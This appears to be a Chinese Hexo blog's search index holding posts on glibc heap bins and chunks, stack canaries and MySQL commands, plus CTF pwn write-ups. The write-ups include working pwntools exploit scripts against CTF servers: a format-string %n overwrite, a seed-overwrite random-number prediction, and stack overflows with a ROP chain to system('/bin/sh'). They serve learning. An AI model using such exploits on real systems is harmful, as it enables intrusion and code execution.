<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>bins</title>
    <url>/2020/04/07/bins/</url>
    <content><![CDATA[<blockquote>
<p>bin是一个由<code>struct chunk</code>结构体组成的链表</p>
<p> bin 用来管理被释放的<code>free chunk</code>，方便下次申请内存使用</p>
<p> ptmalloc 一共维护了 128 个这样的 bin</p>
</blockquote>
<p><a href="https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/">malloc chunk</a></p>
<h1 id="struct-chunk结构"><a href="#struct-chunk结构" class="headerlink" title="struct chunk结构"></a>struct chunk结构</h1><p>struct chunk结构体如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	 <span class="comment">//存放每个 fast chunk 链表头部的指针</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line"> 	<span class="comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到有<code>fastbinsY</code>和<code>bins</code>两种bin数组</p>
<h2 id="fastbinY"><a href="#fastbinY" class="headerlink" title="fastbinY"></a>fastbinY</h2><ul>
<li><p>fastbinsY数组的bin主要回收32字节~128字节（0x20~0x80）的chunk，fastbin 最多可以支持的 bin 的个数为 10 个，</p>
</li>
<li><p>fastbin是单链表，只用到<code>fd</code>指针,遍历顺序是<code>LIFO</code>（后进先出）</p>
</li>
<li><p>prev_inuse位不置0,防止合并</p>
<blockquote>
<p>32位系统下</p>
<p>第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist …</p>
<p>chunk大小对应下标</p>
<p>0          1        2         3         4          5        6          7          8        9</p>
<p>0x10   0x18  0x20   0x28  0x30   0x38   0x40   0x48   0x50   0x58       32位</p>
<p>0x20  0x30   0x40   0x50 0x60    0x70   0x80                                          64位</p>
<p>但是不知道为什么fastbin有十个却好像只用了前七个（貌似与malloc初始化有关)</p>
<p>在32位系统中，fastbin里chunk的大小范围从16到64；    –&gt;0x10到0x40</p>
<p>在64位系统中，fastbin里chunk的大小范围从32到128;    –&gt;0x20到0x80</p>
</blockquote>
<p><img alt="fastbinY.png" data-src="https://i.loli.net/2020/04/08/NXfSmI3Q91ld8x6.png" class="lazyload"></p>
<p>求fastbin的索引</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">    <span class="comment">//64位除16减去2，32位除8减去2</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><ul>
<li><p>bins数组中的第一个 bin 是 <code>unsorted bin</code>（1个），数组中从第 2 个到第 63 个 bin 是 <code>small bin</code>（62个），64到126为<code>large bin</code>（63个）</p>
</li>
<li><p>三种bin都是由free chunks组成的<code>循环双链表</code></p>
</li>
<li><p><code>unsortedbin</code>和<code>small bin</code>采用<code>FIFO</code>(先入先出)算法,</p>
</li>
<li><p><code>unsorted bin</code>中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中</p>
</li>
<li><p><code>small bin</code>中chunk的大小依次增加两个机器字长,与fastbin一样.不过bin有62个，chunk大小从<code>0x10</code>到<code>0x1f8</code>(32位)<code>0x20</code>到<code>0x3f0</code>（64位）</p>
</li>
<li><p><code>largin bin</code> 中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是<code>按从大到小排序</code>的,大的chunk放在一个链表的头部，最小的chunk放在尾部；相同大小的chunk按照最近使用顺序排序</p>
</li>
<li><p>在这63个<code>large bin</code>中，</p>
<ul>
<li><p>前32个大bin按以64字节步长为间隔，即第一个大bin中chunk大小为512〜575字节，第二个大bin中chunk大小为576〜 639字节。紧随其后的16个大bin先以512字节步长为间隔；</p>
</li>
<li><p>之后的8个bin以步长4096为间隔；</p>
</li>
<li><p>再之后的4个bin以32768字节为间隔；</p>
</li>
<li><p>之后的2个bin以262144字节为间隔；</p>
</li>
<li><p>剩下的chunk就放在最后一个大bin中。</p>
</li>
</ul>
</li>
</ul>
<p>  <img alt="QQ截图20200408174926.png" data-src="https://i.loli.net/2020/04/08/e5KBEuVM3714tDn.png" class="lazyload"></p>
<h2 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h2><blockquote>
<p>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</p>
</blockquote>
]]></content>
      <categories>
        <category>堆</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>bin</tag>
        <tag>linux</tag>
        <tag>malloc</tag>
      </tags>
  </entry>
  <entry>
    <title>chunk结构</title>
    <url>/2020/04/07/chunk%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="内存堆块结构"><a href="#内存堆块结构" class="headerlink" title="内存堆块结构"></a>内存堆块结构</h1><blockquote>
<p>malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示</p>
</blockquote>
<blockquote>
<p>结构定义如下</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>prev_size仅在前一个堆块（较低地址）是<code>free</code>状态才生效。</li>
<li>size指的是本chunk的大小即为图中<code>chunk</code>到<code>nextchunk</code>的大小</li>
<li>fd是指向下一个（非物理相邻）被<code>free</code>的 chunk</li>
<li>bk 指向上一个（非物理相邻）被<code>free</code>的 chunk</li>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块</li>
</ul>
<p><img alt="fullsizerender(2).jpg" data-src="https://i.loli.net/2020/04/08/kfoGZs6wjAFv9lz.jpg" class="lazyload"></p>
<blockquote>
<p>简单来讲chunk分为正在使用的chunk：<code>allocated chunk</code>和被free的chunk:<code>free chunk</code></p>
<p>正在使用的chunk如图所示，数据从fd开始写，可能写到下一个chunk的prev_use位</p>
<p>可以说除了size，其他字段都用来写数据，在chunk被free才会发挥各个字段的作用</p>
</blockquote>
<h2 id="各部分详解"><a href="#各部分详解" class="headerlink" title="各部分详解"></a>各部分详解</h2><ul>
<li><p><strong>prev_size</strong>只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。只有<code>chunk 被free</code>空闲的时候才使用，如果前一个chunk未被free，前一个chunk可以覆写到presize位，正如图中所示，chunk可以写<strong><em>内容（user data）</em></strong>到下一个堆块的<code>pre_size</code> <strong>这就是 chunk 中的空间复用</strong></p>
<blockquote>
<p>这样看起来好像size位才是chunk的开始。？</p>
<p>但是chunk块的地址从这里开始</p>
</blockquote>
</li>
<li><p><strong>size</strong>记录当前chunk的大小,大小一般是 <strong>2 * SIZE_SZ</strong> 的最小整数倍。</p>
<blockquote>
<p>若<code>malloc(n)</code> 则<code>size</code>=<strong>(n+SIZE_SZ)再补齐</strong>，</p>
<p>我是看做<code>data</code>部分大小加上<code>size</code>位的大小再补齐</p>
<p> <strong>SIZE_SZ</strong>= 4（32位系统）或8（64位系统）</p>
<p>另外size后三位有特殊用途，所以size的真正大小要将后三位取0</p>
<ul>
<li><p>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
</li>
<li><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
</li>
<li><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
</li>
</ul>
</blockquote>
</li>
<li><p><strong>fd，bk</strong></p>
<blockquote>
<p>malloc成功时返回的地址就是fd的地址</p>
<p>chunk 处于分配状态时，从 fd 字段开始是用户的数据,<code>chunk 被free</code>后才发挥作用</p>
<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
</ul>
</blockquote>
</li>
<li><p><strong>fd_nextsize， bk_nextsize</strong><code>chunk 被free</code>的时候才使用，用于<code>large chunk</code>。</p>
<blockquote>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
</ul>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>堆</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>malloc</tag>
        <tag>chunk结构</tag>
      </tags>
  </entry>
  <entry>
    <title>canary</title>
    <url>/2019/11/08/canary/</url>
    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
<p><strong>Canary</strong></p>
<p>Introduction</p>
<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
<p><strong>Canary 原理</strong></p>
<p>在 GCC 中使用 Canary</p>
<p>可以在 GCC 中使用以下参数设置 Canary:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>

<p><strong>Canary 实现原理</strong> </p>
<p>开启 Canary 保护的 stack 结构大概如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>

<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>保护机制</tag>
      </tags>
  </entry>
  <entry>
    <title>drops做题收获</title>
    <url>/2019/08/08/p/</url>
    <content><![CDATA[<a id="more"></a>




<p>攻防世界 </p>
<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
<p><strong>用法说明</strong></p>
<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
<p>一<br><img alt data-src="/2019/08/08/p/2.png" class="lazyload"><br>利用%x泄露内容</p>
<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
<p>二<br><img alt data-src="/2019/08/08/p/1.jpg" class="lazyload"><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
<p>所以说偏移处指针会不会是指</p>
<pre><code>猜测。。。。
原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
<pre><code> from pwn import *
p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);

pwnme=0x804a068
p.recvuntil(&apos;name:&apos;)
p.sendline(&apos;qqqq&apos;)
p.recvuntil(&apos;please:&apos;)
payload = p32(pwnme)
payload += &apos;aaaa&apos;
payload += &apos;%10$n&apos;
p.sendline(payload)
p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
<p><img alt data-src="/2019/08/08/p/3.png" class="lazyload"></p>
<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
<p>但是区别在于</p>
<p>一</p>
<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
所以写脚本时
guess_num用的是
libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
而dice_game用的是
libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
<pre><code>srand初始化随机种子,rand产生随机数。
随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
实际上是一段数字的循环，这些数字取决于随机种子。
在调用rand()函数时，必须先利用srand()设好随机数种子，
如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
<p>下面是从</p>
<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。

Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)

Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
<p>脚本</p>
<pre><code>from pwn import *
from ctypes import *
#coding:utf-8
p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
payload = &quot;a&quot;*0x20 +p64(1)
p.recvuntil(&apos;Your name:&apos;)
p.sendline(payload)
libc.srand(1)
for i in range(10):
num = str(libc.rand()%6+1)
p.recvuntil(&apos;number:&apos;)
p.sendline(num)

p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
<p>记下函数的地址。</p>
<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
<p>搜到的题解</p>
<pre><code>#! /usr/bin/env python
from pwn import *
p=remote(&apos;111.198.29.45&apos;,56015)
print p.recvuntil(&quot;&gt; &quot;)
p.sendline(&apos;A&apos;)
payload=&apos;A&apos;*32+p32(0x080486cc)
print p.recvuntil(&quot;&gt; &quot;)
p.sendline(payload)
print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
<p><img alt data-src="/2019/08/08/p/4.png" class="lazyload"></p>
<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
<p><img alt data-src="/2019/08/08/p/5.png" class="lazyload"></p>
<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
<p>为什么呢？<br>我也不太清楚。</p>
<p>下面是为什么用32*”A”的原因</p>
<p>重点</p>
<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
<p>因此我用下面的脚本验证发现也可行</p>
<pre><code>#coding:utf-8
from pwn import *

p=remote(&apos;111.198.29.45&apos;,39341)
print p.recvuntil(&quot;&gt; &quot;)
p.sendline(&apos;A&apos;)
payload=&apos;9&apos;*36+p32(0x080486cc)
print p.recvuntil(&quot;&gt; &quot;)
p.sendline(payload)
print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
]]></content>
      <tags>
        <tag>做题题解</tag>
      </tags>
  </entry>
  <entry>
    <title>level0</title>
    <url>/2019/08/08/level0/</url>
    <content><![CDATA[<a id="more"></a>

<p>1.首先要用到</p>
<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
<pre><code>Stack 的作用是防止栈的溢出
NX    的作用为防止栈中的可执行代码
  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
在功能表里找到main,便于分析程序
按tab键会出现伪代码，我们分析这个来找出漏洞
shift+F12可以出现字符串表
ctrl+F 可以出现查找框
想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
这里要了解一下栈的基本结构以及如何传递内容
然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
<p>4.脚本的书写</p>
<pre><code>1.from pwn import *
    (导入pwn里的内容)
2.p=remote(&apos;地址&apos;,端口)
    （连接服务器并创建一个对象）、
3.p.recv()  p.recvline() p.recvuntil()
    (都是接受服务器返回的字符串，具体区别不太懂)
4.p.send()  p.sendline() p.sendafter()
    (都是向服务器传入字符串，具体区别不太懂)
5.p.interactive()
    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
<pre><code>1.buf距离rbp 0x80，rbp本身占位8
2.函数返回地址可填callsystem的地址
3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
<pre><code>3.所以构建的payload为
    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
<p>一</p>
<p>`</p>
<pre><code>#coding:utf-8
from pwn import *
p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
s_addr=0x0000000000400596
p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
p.interactive()</code></pre><p><code>二</code></p>
<pre><code> #coding:utf-8
from pwn import *
p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
rdi=0x400663
p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
p.interactive()</code></pre><p>`</p>
]]></content>
      <tags>
        <tag>做题题解</tag>
      </tags>
  </entry>
  <entry>
    <title>sql命令</title>
    <url>/2020/04/10/sql%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="数据库操作命令"><a href="#数据库操作命令" class="headerlink" title="数据库操作命令"></a>数据库操作命令</h1><ul>
<li><code>sql</code>命令对大小写不敏感，大小写作用相同</li>
</ul>
<blockquote>
<p>命令行界面命令(要加<code>;</code>)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- mysql -u 名字 -p   密码		 #在命令行登录mysql</span><br><span class="line">- select user();				#查询当前用户</span><br><span class="line">- select database()             #查询当前使用的数据库</span><br><span class="line">- show databases ;				#显示所有数据库</span><br><span class="line">- use database_name;			#更改当前数据库</span><br><span class="line">- show  tables;				    #显示数据库的表</span><br><span class="line">- describe 表名;				   #显示表数据</span><br><span class="line">- mysqldump -u 用户名 –p 数据库名 &gt; 导出的文件名; 	#导出数据库文件</span><br></pre></td></tr></table></figure>

